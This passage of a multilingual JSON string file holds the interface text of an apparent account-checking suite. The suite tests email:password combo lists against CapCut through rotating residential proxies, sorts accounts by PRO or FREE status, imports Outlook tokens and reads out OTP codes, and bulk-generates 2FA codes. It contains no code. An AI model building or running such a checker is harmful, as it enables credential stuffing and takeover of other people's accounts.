disalin.", "prx_no_live_dl": "Tidak ada proxy LIVE untuk diunduh.", "nav_menu": "Menu"}, "en": {"brand_sub": "MULTI TOOLS • SOCIAL MEDIA SUITE", "tab_mail": "Mail Checker", "tab_capcut": "CapCut Checker", "tab_2fa": "2FA Generator", "tab_proxy": "Proxy Checker", "tm_accounts_title": "Accounts", "tm_clear_all_title": "Clear All Accounts", "tm_search_acc_ph": "Search account email...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Upload .TXT File (Bulk Auto-read)", "tm_add_btn": "Add", "tm_add_btn_title": "Add Account Manually", "tm_mode_search": "Mode: Search Email", "tm_mode_all": "Mode: All Accounts", "tm_show_all": "Show All", "tm_search_only": "Search Only Mode", "tm_empty_acc_msg": "No accounts yet.<br>Upload a <b>.TXT</b> file or click <b>Add</b>.", "tm_inbox_title": "INBOX", "tm_btn_accounts": "Accounts", "tm_filter_msg_ph": "Filter sender / subject...", "tm_empty_inbox_select": "Select an account on the left to view inbox messages.", "tm_active_email_placeholder": "Select Account", "tm_badge_standby": "● Standby", "tm_badge_connected": "● Connected", "tm_badge_disconnected": "● Disconnected", "tm_btn_copy": "Copy", "tm_no_email_selected": "No email selected", "tm_click_inbox_hint": "Click an email from the inbox list to read its contents.", "tm_otp_detected": "VERIFICATION CODE / OTP DETECTED", "tm_btn_copy_otp": "Copy OTP", "tm_copied": "Copied!", "tm_search_another_title": "Search Another Account", "tm_search_another_desc": "Type an email in the search box above to pick an account.", "tm_accounts_avail": "Accounts Available", "tm_inbox_empty": "Inbox is empty.", "tm_no_msg_filter": "No messages match your filter.", "tm_no_acc_match": "No accounts matching", "tm_delete_acc_confirm": "Delete {email} from list?", "tm_clear_all_confirm": "Clear all Mail Checker accounts?", "tm_extracting": "Extracting & verifying accounts...", "tm_modal_add_title": "Add Outlook / Hotmail Accounts", "tm_modal_upload_label": "UPLOAD .TXT FILE (Bulk Import)", "tm_modal_paste_label": "OR PASTE TOKENS (email|pass|refresh_token|client_id or token only)", "tm_modal_proxy_label": "PROXY (Optional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Leave blank if direct connection", "tm_modal_btn_cancel": "Cancel", "tm_modal_btn_import": "Import & Check", "cc_card_title": "CapCut Account Input", "cc_acc_label": "ACCOUNT LIST (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "RESIDENTIAL PROXY URL (Required)", "cc_proxy_help": "Use token <code>{sess}</code> for automatic IP rotation.", "cc_threads_label": "THREADS", "cc_retries_label": "IP RETRIES", "cc_btn_start": "Start CapCut Check", "cc_btn_stop": "Stop", "cc_results_title": "CapCut Check Results", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "PRO accounts will appear here...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "FREE accounts will appear here...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Failed accounts will appear here...", "cc_btn_copy": "Copy", "cc_btn_save": "Save", "cc_alert_empty": "Please enter CapCut account list!", "cc_alert_no_valid": "No valid accounts found!", "tfa_single_title": "Quick 2FA Code (Single)", "tfa_single_desc": "Enter a 2FA Secret Key (Base32) to generate instant 6-digit verification codes.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Example: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Get Code", "tfa_auth_code_label": "AUTHENTICATOR CODE", "tfa_btn_copy_code": "Copy Code", "tfa_bulk_title": "Bulk 2FA Generator", "tfa_bulk_desc": "Supports pasting multiple Secret Keys or combo lines (format <code>email|pass|secret</code> or secret per line).", "tfa_bulk_label": "INPUT LIST SECRETS / COMBOS", "tfa_bulk_ph": "Example format:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...\\nHXDMVJZTGNCDESRR...", "tfa_btn_gen_all": "Generate All Codes", "tfa_bulk_res_label": "RESULTS (COMBO + 2FA CODE FORMAT)", "tfa_bulk_res_ph": "Generated 2FA codes will appear here...", "tfa_alert_empty_single": "Please enter a 2FA Secret Key!", "tfa_alert_empty_bulk": "Please enter secret list or combo lines!", "tfa_processing": "Processing...", "prx_title": "Proxy Checker", "prx_desc": "Supported formats: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, or <code>scheme://...</code>", "prx_input_label": "INPUT PROXY LIST", "prx_btn_sample": "Sample", "prx_btn_clear": "Clear", "prx_input_ph": "Example format:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password\\nusername:password:192.168.1.1:8080\\nhttp://user:pass@192.168.1.1:8080", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Scamalytics Fraud Score Check", "prx_btn_start": "Start Checking", "prx_btn_stop": "Stop", "prx_stat_total": "TOTAL", "prx_stat_live": "LIVE", "prx_stat_dead": "DEAD", "prx_stat_latency": "AVG LATENCY", "prx_stat_clean": "LOW FRAUD (<25)", "prx_filter_all": "All", "prx_filter_live": "Live", "prx_filter_dead": "Dead", "prx_filter_clean": "Low Fraud", "prx_search_ph": "Search IP / Country...", "prx_btn_export": "Export", "prx_exp_live_raw": "Copy Live (Original Format)", "prx_exp_live_ipport": "Copy Live (HOST:PORT)", "prx_exp_live_txt": "Download Live (.TXT)", "prx_exp_report_json": "Download Full Report (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "EXIT IP & LOCATION", "prx_th_isp": "ISP / ORG", "prx_th_fraud": "FRAUD RISK", "prx_th_act": "ACT", "prx_empty_table": "No proxies checked yet. Enter proxy list and click <b>Start Checking</b>.", "prx_no_match": "No proxies match your search or filter.", "prx_modal_title": "Proxy Diagnostic Details", "prx_modal_close": "Close", "prx_alert_empty": "Please enter a proxy list!", "prx_no_live_copy": "No LIVE proxies to copy.", "prx_no_live_dl": "No LIVE proxies to download.", "nav_menu": "Menu"}, "vi": {"brand_sub": "ĐA CÔNG CỤ • DỊCH VỤ MẠNG XÃ HỘI", "tab_mail": "Kiểm Tra Mail", "tab_capcut": "Kiểm Tra CapCut", "tab_2fa": "Tạo Mã 2FA", "tab_proxy": "Kiểm Tra Proxy", "tm_accounts_title": "Tài Khoản", "tm_clear_all_title": "Xóa Tất Cả Tài Khoản", "tm_search_acc_ph": "Tìm kiếm email tài khoản...", "tm_upload_txt": "Tải Lên .TXT", "tm_upload_txt_title": "Tải Tệp .TXT (Nhập Tự Động Hàng Loạt)", "tm_add_btn": "Thêm", "tm_add_btn_title": "Thêm Tài Khoản Thủ Công", "tm_mode_search": "Chế độ: Tìm Email", "tm_mode_all": "Chế độ: Tất Cả", "tm_show_all": "Hiện Tất Cả", "tm_search_only": "Chỉ Tìm Kiếm", "tm_empty_acc_msg": "Chưa có tài khoản.<br>Tải lên tệp <b>.TXT</b> hoặc bấm <b>Thêm</b>.", "tm_inbox_title": "HỘP THƯ ĐẾN", "tm_btn_accounts": "Tài Khoản", "tm_filter_msg_ph": "Lọc người gửi / tiêu đề...", "tm_empty_inbox_select": "Chọn một tài khoản ở bên trái để xem tin nhắn.", "tm_active_email_placeholder": "Chọn Tài Khoản", "tm_badge_standby": "● Chờ", "tm_badge_connected": "● Đã Kết Nối", "tm_badge_disconnected": "● Ngắt Kết Nối", "tm_btn_copy": "Sao Chép", "tm_no_email_selected": "Chưa chọn thư nào", "tm_click_inbox_hint": "Bấm vào một thư trong danh sách để đọc nội dung.", "tm_otp_detected": "PHÁT HIỆN MÃ XÁC THỰC / OTP", "tm_btn_copy_otp": "Sao Chép OTP", "tm_copied": "Đã sao chép!", "tm_search_another_title": "Tìm Tài Khoản Khác", "tm_search_another_desc": "Gõ email vào ô tìm kiếm phía trên để chọn tài khoản.", "tm_accounts_avail": "Tài Khoản Khả Dụng", "tm_inbox_empty": "Hộp thư rỗng.", "tm_no_msg_filter": "Không có thư nào khớp bộ lọc.", "tm_no_acc_match": "Không tìm thấy tài khoản", "tm_delete_acc_confirm": "Xóa {email} khỏi danh sách?", "tm_clear_all_confirm": "Xóa toàn bộ tài khoản Mail Checker?", "tm_extracting": "Đang trích xuất & kiểm tra...", "tm_modal_add_title": "Thêm Tài Khoản Outlook / Hotmail", "tm_modal_upload_label": "TẢI TỆP .TXT (Nhập Hàng Loạt)", "tm_modal_paste_label": "HOẶC DÁN TOKEN (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Tùy chọn: http://user:pass@host:port)", "tm_modal_proxy_ph": "Để trống nếu kết nối trực tiếp", "tm_modal_btn_cancel": "Hủy", "tm_modal_btn_import": "Nhập & Kiểm Tra", "cc_card_title": "Nhập Tài Khoản CapCut", "cc_acc_label": "DANH SÁCH (email:pass, email|pass,...)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENTIAL (Bắt buộc)", "cc_proxy_help": "Dùng <code>{sess}</code> để tự động xoay IP.", "cc_threads_label": "LUỒNG", "cc_retries_label": "THỬ LẠI IP", "cc_btn_start": "Bắt Đầu Check CapCut", "cc_btn_stop": "Dừng", "cc_results_title": "Kết Quả Check CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Tài khoản PRO sẽ hiển thị ở đây...", "cc_free_title": "FREE / THƯỜNG", "cc_free_ph": "Tài khoản FREE sẽ hiển thị ở đây...", "cc_dead_title": "DEAD / LỖI", "cc_dead_ph": "Tài khoản lỗi sẽ hiển thị ở đây...", "cc_btn_copy": "Sao Chép", "cc_btn_save": "Lưu", "cc_alert_empty": "Vui lòng nhập danh sách tài khoản CapCut!", "cc_alert_no_valid": "Không tìm thấy tài khoản hợp lệ!", "tfa_single_title": "Mã 2FA Nhanh (Đơn)", "tfa_single_desc": "Nhập 2FA Secret Key (Base32) để nhận mã xác minh 6 số tức thì.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Ví dụ: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Lấy Mã", "tfa_auth_code_label": "MÃ XÁC THỰC", "tfa_btn_copy_code": "Sao Chép Mã", "tfa_bulk_title": "Tạo 2FA Hàng Loạt", "tfa_bulk_desc": "Hỗ trợ dán nhiều Secret Key hoặc dòng combo (định dạng <code>email|pass|secret</code> hoặc secret mỗi dòng).", "tfa_bulk_label": "NHẬP DANH SÁCH SECRETS / COMBOS", "tfa_bulk_ph": "Ví dụ:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Tạo Tất Cả Mã", "tfa_bulk_res_label": "KẾT QUẢ (COMBO + MÃ 2FA)", "tfa_bulk_res_ph": "Mã 2FA sẽ xuất hiện tại đây...", "tfa_alert_empty_single": "Vui lòng nhập Secret Key 2FA!", "tfa_alert_empty_bulk": "Vui lòng nhập danh sách secret/combo!", "tfa_processing": "Đang xử lý...", "prx_title": "Kiểm Tra Proxy", "prx_desc": "Hỗ trợ: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, hoặc <code>scheme://...</code>", "prx_input_label": "DANH SÁCH PROXY", "prx_btn_sample": "Mẫu", "prx_btn_clear": "Xóa", "prx_input_ph": "Ví dụ:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "LUỒNG", "prx_timeout_label": "THỜI GIAN CHỜ (s)", "prx_scamalytics_toggle": "Kiểm Tra Điểm Gian Lận Scamalytics", "prx_btn_start": "Bắt Đầu Kiểm Tra", "prx_btn_stop": "Dừng", "prx_stat_total": "TỔNG SỐ", "prx_stat_live": "SỐNG (LIVE)", "prx_stat_dead": "CHẾT (DEAD)", "prx_stat_latency": "ĐỘ TRỄ TB", "prx_stat_clean": "RỦI RO THẤP (<25)", "prx_filter_all": "Tất Cả", "prx_filter_live": "Sống", "prx_filter_dead": "Chết", "prx_filter_clean": "Sạch (Low Fraud)", "prx_search_ph": "Tìm IP / Quốc gia...", "prx_btn_export": "Xuất Dữ Liệu", "prx_exp_live_raw": "Sao Chép Live (Định Dạng Gốc)", "prx_exp_live_ipport": "Sao Chép Live (HOST:PORT)", "prx_exp_live_txt": "Tải Xuống Live (.TXT)", "prx_exp_report_json": "Tải Báo Cáo Đầy Đủ (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "TRẠNG THÁI", "prx_th_ping": "PING", "prx_th_loc": "IP THOÁT & VỊ TRÍ", "prx_th_isp": "NHÀ MẠNG / TỔ CHỨC", "prx_th_fraud": "ĐIỂM RỦI RO", "prx_th_act": "CHI TIẾT", "prx_empty_table": "Chưa kiểm tra proxy nào. Nhập danh sách và bấm <b>Bắt Đầu Kiểm Tra</b>.", "prx_no_match": "Không có proxy nào khớp bộ lọc.", "prx_modal_title": "Chi Tiết Chẩn Đoán Proxy", "prx_modal_close": "Đóng", "prx_alert_empty": "Vui lòng nhập danh sách proxy!", "prx_no_live_copy": "Không có proxy LIVE nào để sao chép.", "prx_no_live_dl": "Không có proxy LIVE nào để tải về.", "nav_menu": "Menu"}, "zh": {"brand_sub": "多功能工具箱 • 社交媒体服务", "tab_mail": "邮箱检测器", "tab_capcut": "CapCut检测器", "tab_2fa": "2FA生成器", "tab_proxy": "代理检测器", "tm_accounts_title": "账号列表", "tm_clear_all_title": "清空所有账号", "tm_search_acc_ph": "搜索账号邮箱...", "tm_upload_txt": "上传 .TXT", "tm_upload_txt_title": "上传 .TXT 文件 (批量自动读取)", "tm_add_btn": "添加", "tm_add_btn_title": "手动添加账号", "tm_mode_search": "模式: 搜索邮箱", "tm_mode_all": "模式: 全部账号", "tm_show_all": "显示全部", "tm_search_only": "仅搜索模式", "tm_empty_acc_msg": "暂无账号。<br>上传 <b>.TXT</b> 文件或点击 <b>添加</b>。", "tm_inbox_title": "收件箱", "tm_btn_accounts": "账号", "tm_filter_msg_ph": "过滤发件人 / 主题...", "tm_empty_inbox_select": "请在左侧选择账号以查看收件箱消息。", "tm_active_email_placeholder": "选择账号", "tm_badge_standby": "● 待命", "tm_badge_connected": "● 已连接", "tm_badge_disconnected": "● 已断开", "tm_btn_copy": "复制", "tm_no_email_selected": "未选择邮件", "tm_click_inbox_hint": "点击收件箱列表中的邮件以阅读详细内容。", "tm_otp_detected": "已检测到验证码 / OTP", "tm_btn_copy_otp": "复制验证码", "tm_copied": "已复制!", "tm_search_another_title": "搜索其他账号", "tm_search_another_desc": "在上方搜索框输入邮箱以选取账号。", "tm_accounts_avail": "个可用账号", "tm_inbox_empty": "收件箱为空。", "tm_no_msg_filter": "没有符合过滤条件的消息。", "tm_no_acc_match": "未找到匹配账号", "tm_delete_acc_confirm": "确定从列表中删除 {email} 吗？", "tm_clear_all_confirm": "确定清空所有邮箱检测账号吗？", "tm_extracting": "正在提取并检测账号...", "tm_modal_add_title": "添加 Outlook / Hotmail 账号", "tm_modal_upload_label": "上传 .TXT 文件 (批量导入)", "tm_modal_paste_label": "或粘贴令牌 (email|pass|refresh_token|client_id 或仅token)", "tm_modal_proxy_label": "代理 (可选: http://user:pass@host:port)", "tm_modal_proxy_ph": "直接连接请留空", "tm_modal_btn_cancel": "取消", "tm_modal_btn_import": "导入并检测", "cc_card_title": "输入 CapCut 账号", "cc_acc_label": "账号列表 (email:pass, email|pass 等)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "住宅代理 URL (必填)", "cc_proxy_help": "使用 <code>{sess}</code> 变量实现自动轮换 IP。", "cc_threads_label": "线程数", "cc_retries_label": "IP重试次数", "cc_btn_start": "开始检测 CapCut", "cc_btn_stop": "停止", "cc_results_title": "CapCut 检测结果", "cc_pro_title": "PRO / VIP 会员", "cc_pro_ph": "PRO 账号将在此显示...", "cc_free_title": "FREE / 普通账号", "cc_free_ph": "FREE 账号将在此显示...", "cc_dead_title": "DEAD / 错误账号", "cc_dead_ph": "失败账号将在此显示...", "cc_btn_copy": "复制", "cc_btn_save": "保存", "cc_alert_empty": "请输入 CapCut 账号列表！", "cc_alert_no_valid": "未找到有效账号！", "tfa_single_title": "快捷 2FA 验证码 (单条)", "tfa_single_desc": "输入 2FA Secret Key (Base32) 即刻生成6位动态验证码。", "tfa_single_label": "2FA 密钥 (SECRET KEY)", "tfa_single_ph": "示例: JBSWY3DPEHPK3PXP", "tfa_btn_get": "获取验证码", "tfa_auth_code_label": "动态验证码", "tfa_btn_copy_code": "复制代码", "tfa_bulk_title": "批量 2FA 生成器", "tfa_bulk_desc": "支持批量粘贴密钥或组合行 (格式: <code>email|pass|secret</code> 或每行一个密钥)。", "tfa_bulk_label": "输入密钥列表 / 组合数据", "tfa_bulk_ph": "示例格式:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "批量生成所有验证码", "tfa_bulk_res_label": "生成结果 (组合格式 + 2FA 码)", "tfa_bulk_res_ph": "2FA 结果将在此显示...", "tfa_alert_empty_single": "请输入 2FA 密钥！", "tfa_alert_empty_bulk": "请输入密钥列表或组合数据！", "tfa_processing": "处理中...", "prx_title": "代理检测器", "prx_desc": "支持格式: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, 或 <code>scheme://...</code>", "prx_input_label": "输入代理列表", "prx_btn_sample": "示例", "prx_btn_clear": "清空", "prx_input_ph": "示例格式:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password", "prx_threads_label": "并发线程", "prx_timeout_label": "超时时间 (秒)", "prx_scamalytics_toggle": "Scamalytics 欺诈风险深度检测", "prx_btn_start": "开始检测", "prx_btn_stop": "停止", "prx_stat_total": "总数", "prx_stat_live": "存活 (LIVE)", "prx_stat_dead": "失效 (DEAD)", "prx_stat_latency": "平均延迟", "prx_stat_clean": "低风险 (<25)", "prx_filter_all": "全部", "prx_filter_live": "存活", "prx_filter_dead": "失效", "prx_filter_clean": "纯净 (低风险)", "prx_search_ph": "搜索 IP / 国家...", "prx_btn_export": "导出数据", "prx_exp_live_raw": "复制存活 (原始格式)", "prx_exp_live_ipport": "复制存活 (HOST:PORT)", "prx_exp_live_txt": "下载存活 (.TXT)", "prx_exp_report_json": "下载完整报告 (.JSON)", "prx_th_proxy": "代理地址", "prx_th_status": "状态", "prx_th_ping": "延迟", "prx_th_loc": "出口IP与归属地", "prx_th_isp": "运营商 / 组织", "prx_th_fraud": "欺诈评分", "prx_th_act": "详情", "prx_empty_table": "尚未检测任何代理。输入代理列表并点击 <b>开始检测</b>。", "prx_no_match": "没有匹配的代理数据。", "prx_modal_title": "代理诊断详情", "prx_modal_close": "关闭", "prx_alert_empty": "请输入代理列表！", "prx_no_live_copy": "没有存活的代理可供复制。", "prx_no_live_dl": "没有存活的代理可供下载。", "nav_menu": "菜单 (Menu)"}, "ru": {"brand_sub": "МУЛЬТИ-ИНСТРУМЕНТЫ • SMM СЕРВИС", "tab_mail": "Чекер Почты", "tab_capcut": "Чекер CapCut", "tab_2fa": "Генератор 2FA", "tab_proxy": "Чекер Прокси", "tm_accounts_title": "Аккаунты", "tm_clear_all_title": "Удалить все аккаунты", "tm_search_acc_ph": "Поиск email аккаунта...", "tm_upload_txt": "Загрузить .TXT", "tm_upload_txt_title": "Загрузить файл .TXT (Массовый импорт)", "tm_add_btn": "Добавить", "tm_add_btn_title": "Добавить аккаунт вручную", "tm_mode_search": "Режим: Поиск Email", "tm_mode_all": "Режим: Все Аккаунты", "tm_show_all": "Показать все", "tm_search_only": "Только поиск", "tm_empty_acc_msg": "Нет аккаунтов.<br>Загрузите файл <b>.TXT</b> или нажмите <b>Добавить</b>.", "tm_inbox_title": "ВХОДЯЩИЕ", "tm_btn_accounts": "Аккаунты", "tm_filter_msg_ph": "Фильтр отправителя / темы...", "tm_empty_inbox_select": "Выберите аккаунт слева для просмотра входящих сообщений.", "tm_active_email_placeholder": "Выберите аккаунт", "tm_badge_standby": "● Ожидание", "tm_badge_connected": "● Подключено", "tm_badge_disconnected": "● Отключено", "tm_btn_copy": "Копировать", "tm_no_email_selected": "Письмо не выбрано", "tm_click_inbox_hint": "Нажмите на письмо в списке входящих, чтобы прочитать его.", "tm_otp_detected": "ОБНАРУЖЕН КОД ПОДТВЕРЖДЕНИЯ / OTP", "tm_btn_copy_otp": "Скопировать OTP", "tm_copied": "Скопировано!", "tm_search_another_title": "Найти другой аккаунт", "tm_search_another_desc": "Введите email в строке поиска выше, чтобы выбрать аккаунт.", "tm_accounts_avail": "Доступно аккаунтов", "tm_inbox_empty": "Входящие пусты.", "tm_no_msg_filter": "Нет сообщений, соответствующих фильтру.", "tm_no_acc_match": "Аккаунты не найдены", "tm_delete_acc_confirm": "Удалить {email} из списка?", "tm_clear_all_confirm": "Очистить все аккаунты чекера почты?", "tm_extracting": "Извлечение и проверка аккаунтов...", "tm_modal_add_title": "Добавить аккаунты Outlook / Hotmail", "tm_modal_upload_label": "ЗАГРУЗИТЬ ФАЙЛ .TXT (Массовый импорт)", "tm_modal_paste_label": "ИЛИ ВСТАВИТЬ ТОКЕНЫ (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "ПРОКСИ (Опционально: http://user:pass@host:port)", "tm_modal_proxy_ph": "Оставьте пустым для прямого соединения", "tm_modal_btn_cancel": "Отмена", "tm_modal_btn_import": "Импорт и проверка", "cc_card_title": "Ввод аккаунтов CapCut", "cc_acc_label": "СПИСОК АККАУНТОВ (email:pass, email|pass и т.д.)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL РЕЗИДЕНТСКИХ ПРОКСИ (Обязательно)", "cc_proxy_help": "Используйте <code>{sess}</code> для авто-ротации IP.", "cc_threads_label": "ПОТОКИ", "cc_retries_label": "ПОВТОРЫ IP", "cc_btn_start": "Начать проверку CapCut", "cc_btn_stop": "Стоп", "cc_results_title": "Результаты проверки CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "PRO аккаунты появятся здесь...", "cc_free_title": "FREE / ОБЫЧНЫЕ", "cc_free_ph": "FREE аккаунты появятся здесь...", "cc_dead_title": "DEAD / ОШИБКА", "cc_dead_ph": "Невалидные аккаунты появятся здесь...", "cc_btn_copy": "Копировать", "cc_btn_save": "Сохранить", "cc_alert_empty": "Пожалуйста, введите список аккаунтов CapCut!", "cc_alert_no_valid": "Валидные аккаунты не найдены!", "tfa_single_title": "Быстрый 2FA код (Одиночный)", "tfa_single_desc": "Введите 2FA Secret Key (Base32) для мгновенной генерации 6-значного кода.", "tfa_single_label": "СЕКРЕТНЫЙ КЛЮЧ 2FA", "tfa_single_ph": "Пример: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Получить код", "tfa_auth_code_label": "КОД АУТЕНТИФИКАЦИИ", "tfa_btn_copy_code": "Скопировать код", "tfa_bulk_title": "Массовый генератор 2FA", "tfa_bulk_desc": "Поддерживает вставку нескольких ключей или combo строк (формат <code>email|pass|secret</code>).", "tfa_bulk_label": "СПИСОК КЛЮЧЕЙ / COMBO", "tfa_bulk_ph": "Пример:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Сгенерировать все коды", "tfa_bulk_res_label": "РЕЗУЛЬТАТ (ФОРМАТ COMBO + 2FA КОД)", "tfa_bulk_res_ph": "Результаты 2FA появятся здесь...", "tfa_alert_empty_single": "Пожалуйста, введите секретный ключ 2FA!", "tfa_alert_empty_bulk": "Пожалуйста, введите список ключей или combo строк!", "tfa_processing": "Обработка...", "prx_title": "Чекер Прокси", "prx_desc": "Форматы: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, или <code>scheme://...</code>", "prx_input_label": "СПИСОК ПРОКСИ", "prx_btn_sample": "Пример", "prx_btn_clear": "Очистить", "prx_input_ph": "Пример:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "ПОТОКИ", "prx_timeout_label": "ТАЙМАУТ (сек)", "prx_scamalytics_toggle": "Глубокая проверка фрода Scamalytics", "prx_btn_start": "Начать проверку", "prx_btn_stop": "Стоп", "prx_stat_total": "ВСЕГО", "prx_stat_live": "ЖИВЫЕ (LIVE)", "prx_stat_dead": "МЕРТВЫЕ (DEAD)", "prx_stat_latency": "СР. ПИНГ", "prx_stat_clean": "НИЗКИЙ РИСК (<25)", "prx_filter_all": "Все", "prx_filter_live": "Живые", "prx_filter_dead": "Мертвые", "prx_filter_clean": "Чистые (<25)", "prx_search_ph": "Поиск IP / Страны...", "prx_btn_export": "Экспорт", "prx_exp_live_raw": "Копировать Live (Исходный формат)", "prx_exp_live_ipport": "Копировать Live (HOST:PORT)", "prx_exp_live_txt": "Скачать Live (.TXT)", "prx_exp_report_json": "Скачать полный отчет (.JSON)", "prx_th_proxy": "ПРОКСИ", "prx_th_status": "СТАТУС", "prx_th_ping": "ПИНГ", "prx_th_loc": "ВЫХОДНОЙ IP И ЛОКАЦИЯ", "prx_th_isp": "ПРОВАЙДЕР / ОРГ", "prx_th_fraud": "РИСК ФРОДА", "prx_th_act": "ИНФО", "prx_empty_table": "Прокси еще не проверены. Вставьте список и нажмите <b>Начать проверку</b>.", "prx_no_match": "Нет прокси, соответствующих фильтру.", "prx_modal_title": "Диагностика Прокси", "prx_modal_close": "Закрыть", "prx_alert_empty": "Пожалуйста, введите список прокси!", "prx_no_live_copy": "Нет LIVE прокси для копирования.", "prx_no_live_dl": "Нет LIVE прокси для скачивания.", "nav_menu": "Меню"}, "es": {"brand_sub": "HERRAMIENTAS MÚLTIPLES • SERVICIOS SOCIALES", "tab_mail": "Verificador de Mail", "tab_capcut": "Verificador CapCut", "tab_2fa": "Generador 2FA", "tab_proxy": "Verificador de Proxy", "tm_accounts_title": "Cuentas", "tm_clear_all_title": "Borrar todas las cuentas", "tm_search_acc_ph": "Buscar correo de cuenta...", "tm_upload_txt": "Subir .TXT", "tm_upload_txt_title": "Subir archivo .TXT (Lectura masiva)", "tm_add_btn": "Añadir", "tm_add_btn_title": "Añadir cuenta manual", "tm_mode_search": "Modo: Buscar Correo", "tm_mode_all": "Modo: Todas las Cuentas", "tm_show_all": "Mostrar Todo", "tm_search_only": "Solo Buscar", "tm_empty_acc_msg": "Aún no hay cuentas.<br>Sube un archivo <b>.TXT</b> o pulsa <b>Añadir</b>.", "tm_inbox_title": "BANDEJA DE ENTRADA", "tm_btn_accounts": "Cuentas", "tm_filter_msg_ph": "Filtrar remitente / asunto...", "tm_empty_inbox_select": "Selecciona una cuenta a la izquierda para ver los mensajes.", "tm_active_email_placeholder": "Seleccionar Cuenta", "tm_badge_standby": "● En espera", "tm_badge_connected": "● Conectado", "tm_badge_disconnected": "● Desconectado", "tm_btn_copy": "Copiar", "tm_no_email_selected": "Ningún correo seleccionado", "tm_click_inbox_hint": "Haz clic en un correo de la lista para leer su contenido.", "tm_otp_detected": "CÓDIGO DE VERIFICACIÓN / OTP DETECTADO", "tm_btn_copy_otp": "Copiar OTP", "tm_copied": "¡Copiado!", "tm_search_another_title": "Buscar Otra Cuenta", "tm_search_another_desc": "Escribe el correo en el cuadro de búsqueda para elegir una cuenta.", "tm_accounts_avail": "Cuentas Disponibles", "tm_inbox_empty": "Bandeja vacía.", "tm_no_msg_filter": "No hay mensajes que coincidan con el filtro.", "tm_no_acc_match": "No se encontraron cuentas", "tm_delete_acc_confirm": "¿Eliminar {email} de la lista?", "tm_clear_all_confirm": "¿Borrar todas las cuentas del verificador?", "tm_extracting": "Extrayendo y verificando cuentas...", "tm_modal_add_title": "Añadir Cuentas Outlook / Hotmail", "tm_modal_upload_label": "SUBIR ARCHIVO .TXT (Importación Masiva)", "tm_modal_paste_label": "O PEGAR TOKENS (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Opcional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Dejar en blanco si es directo", "tm_modal_btn_cancel": "Cancelar", "tm_modal_btn_import": "Importar y Verificar", "cc_card_title": "Entrada de Cuentas CapCut", "cc_acc_label": "LISTA DE CUENTAS (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENCIAL (Obligatorio)", "cc_proxy_help": "Usa <code>{sess}</code> para rotación automática de IP.", "cc_threads_label": "HILOS", "cc_retries_label": "REINTENTOS IP", "cc_btn_start": "Iniciar Verificación CapCut", "cc_btn_stop": "Detener", "cc_results_title": "Resultados de Verificación CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Las cuentas PRO aparecerán aquí...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Las cuentas FREE aparecerán aquí...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Las cuentas fallidas aparecerán aquí...", "cc_btn_copy": "Copiar", "cc_btn_save": "Guardar", "cc_alert_empty": "¡Por favor ingresa la lista de cuentas CapCut!", "cc_alert_no_valid": "¡No se encontraron cuentas válidas!", "tfa_single_title": "Código 2FA Rápido (Individual)", "tfa_single_desc": "Ingresa la clave secreta 2FA (Base32) para obtener códigos instantáneos de 6 dígitos.", "tfa_single_label": "CLAVE SECRETA 2FA", "tfa_single_ph": "Ejemplo: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Obtener Código", "tfa_auth_code_label": "CÓDIGO DE AUTENTICACIÓN", "tfa_btn_copy_code": "Copiar Código", "tfa_bulk_title": "Generador 2FA Masivo", "tfa_bulk_desc": "Soporta pegar múltiples claves o líneas combo (formato <code>email|pass|secret</code>).", "tfa_bulk_label": "LISTA DE CLAVES / COMBOS", "tfa_bulk_ph": 